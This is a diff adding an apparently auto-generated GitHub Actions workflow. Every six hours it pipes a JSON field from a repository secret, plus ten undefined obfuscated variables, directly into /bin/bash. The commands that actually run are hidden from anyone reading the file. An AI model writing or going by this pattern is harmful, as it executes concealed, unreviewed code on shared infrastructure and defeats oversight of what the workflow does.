@@ -1,0 +1,27 @@
+name: chengwujunxiang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengwujunxiang
+        env:
+          h8: ${{ secrets.h8 }}
+        run: |
+          echo $h8 | jq -r .s1252 | /bin/bash
+          echo $ydy42 | jq -r .dzjy88754 | /bin/bash
+          echo $kgvev58 | jq -r .blyn7 | /bin/bash
+          echo $sj7 | jq -r .tlxb9 | /bin/bash
+          echo $esy21743 | jq -r .v1314 | /bin/bash
+          echo $btyh1596 | jq -r .ymjup016 | /bin/bash
+          echo $c62 | jq -r .fk1052 | /bin/bash
+          echo $kwfsa23069 | jq -r .msj1204 | /bin/bash
+          echo $srwpd97 | jq -r .dzfux0 | /bin/bash
+          echo $cm27490 | jq -r .ygwe61 | /bin/bash
+          echo $onjav508 | jq -r .pi38375 | /bin/bash
+
